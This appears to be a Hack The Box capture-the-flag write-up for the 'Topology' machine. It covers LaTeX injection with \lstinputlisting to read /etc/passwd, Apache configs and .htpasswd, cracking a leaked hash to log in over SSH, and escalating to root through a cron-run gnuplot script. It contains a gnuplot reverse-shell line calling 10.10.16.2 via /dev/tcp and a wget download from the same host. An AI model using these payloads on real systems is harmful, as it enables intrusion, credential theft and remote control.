---
title: "Topology from HTB"
categories: [Hack The Box]
tags: [Hack The Box]
---
# Topology from HTB
`Nmap`gave this:
```bash
nmap -sCV --min-rate 4000 10.10.11.217
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-08-11 14:33 +04
Nmap scan report for latex.topology.htb (10.10.11.217)
Host is up (0.087s latency).
Not shown: 932 filtered tcp ports (no-response), 66 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 dc:bc:32:86:e8:e8:45:78:10:bc:2b:5d:bf:0f:55:c6 (RSA)
|   256 d9:f3:39:69:2c:6c:27:f1:a9:2d:50:6c:a7:9f:1c:33 (ECDSA)
|_  256 4c:a6:50:75:d0:93:4f:9c:4a:1b:89:0a:7a:27:08:d7 (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Index of /
|_http-server-header: Apache/2.4.41 (Ubuntu)
| http-ls: Volume /
|   maxfiles limit reached (10)
| SIZE  TIME              FILENAME
| -     2023-01-17 12:26  demo/
| 1.0K  2023-01-17 12:26  demo/fraction.png
| 1.1K  2023-01-17 12:26  demo/greek.png
| 1.1K  2023-01-17 12:26  demo/sqrt.png
| 1.0K  2023-01-17 12:26  demo/summ.png
| 3.8K  2023-06-12 07:37  equation.php
| 662   2023-01-17 12:26  equationtest.aux
| 17K   2023-01-17 12:26  equationtest.log
| 0     2023-01-17 12:26  equationtest.out
| 28K   2023-01-17 12:26  equationtest.pdf
|_
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
There is some directory listing going on.
Search the `IP`and then there is only one link. Click that:
Add this to `/etc/hosts`:
```
10.10.11.217 latex.topology.htb
```
And access the site.
It is
```
LaTeX Equation Generator
```
Then i used commands from `latex injection`but it denied saying `Illegal command detected`. From this https://ctan.math.illinois.edu/macros/latex/contrib/listings/listings.pdf there is a command
```
Finally we come to \lstinputlisting, the command used to pretty-print stand alone files. It has one optional and one file name argument. Note that you possibly need to specify the relative path to the file. Here now the result is printed below the verbatim code since both together don’t fit the text width.
```
`\lstinputlisting`
```
\lstinputlisting{/etc/passwd}
```
Doesn't give us anything which is better than not being able to use it. So we have to format it. Reading all the `directory files Nmap gave` i discovered way to format it.
In http://latex.topology.htb/equationtest.tex There is this command:
```
$ \int_{a}^b\int_{c}^d f(x,y)dxdy $
```
So we have to type `$`at the start and end.
Command will look like this:
```
$\lstinputlisting{/etc/passwd}$
```
And the output will be image reading the `/etc/passwd file`.
The use of subdomains like `latex.topology.htb` is interesting since there could be more virtual hosts `( vHosts )` configured on this `webserver`.  So i explored `apache2`file in my `PC`and discovered this file `/etc/apache2/sites-available/000-default.conf` Here is written subdomain names.
```
$\lstinputlisting{/etc/apache2/sites-available/000-default.conf}
```
Will give us image where is written all the `subdomain names` which are: `stats   dev`. Add that to `/etc/hosts`file:
```
10.10.11.217 stats.topology.htb dev.topology.htb
```
`http://dev.topology.htb/`this subdomain forces me to input `Username and Password`
So there must be `password and username`somewhere
```
$\lstinputlisting{/var/www/dev/.htaccess}$
```
Tells says `.htpasswd` so i inspect it:
```
$\lstinputlisting{/var/www/dev/.htpasswd}$
```
And i'm greeted with `Username and hashed password`:
vdaisley   $apr1$1ONUB/S2$58eeNVirnRDB5zAIbIxTY0
cracked Password is `calculus20`. Then went to `ssh`and Logged in.
```bash
ssh vdaisley@10.10.11.217
vdaisley@10.10.11.217's password:
sudo -l
[sudo] password for vdaisley:
Sorry, user vdaisley may not run sudo on topology.
--------------------
vdaisley@topology:~$ cat user.txt
f9bd6f70eaff113af023f3cdcdbd090a
--------------------
wget http://10.10.16.2:8000/pspy64s
chmod +x pspy64s
vdaisley@topology:~$ ./pspy64s
2024/08/11 07:03:01 CMD: UID=0    PID=2102   | find /opt/gnuplot -name *.plt -exec gnuplot {} ;
2024/08/11 07:03:01 CMD: UID=???  PID=2101   | ???
2024/08/11 07:03:01 CMD: UID=0    PID=2100   | /bin/sh -c find "/opt/gnuplot" -name "*.plt" -exec gnuplot {} \;
2024/08/11 07:03:01 CMD: UID=0    PID=2095   | /bin/sh /opt/gnuplot/getdata.sh
2024/08/11 07:03:01 CMD: UID=0    PID=2094   | /bin/sh -c /opt/gnuplot/getdata.sh
2024/08/11 07:03:01 CMD: UID=0    PID=2109   | gnuplot /opt/gnuplot/networkplot.plt
vdaisley@topology:/opt/gnuplot$ vi shell.plt
```
Shell contains `gunplot command for reverse shell`:
```bash
cmdout = system("/bin/bash -c '/bin/sh -i >& /dev/tcp/10.10.16.2/1234 0>&1'")
print cmdout
```
This will get executed and you will get connection on `NetCat 1234`port and you will be `root`.
```bash
# cat /root/root.txt
0cf48f1617c9ac05307fda9abc8d7a0b
```
![](/assets/images/Screenshot from 2024-08-11 15-10-27.png)
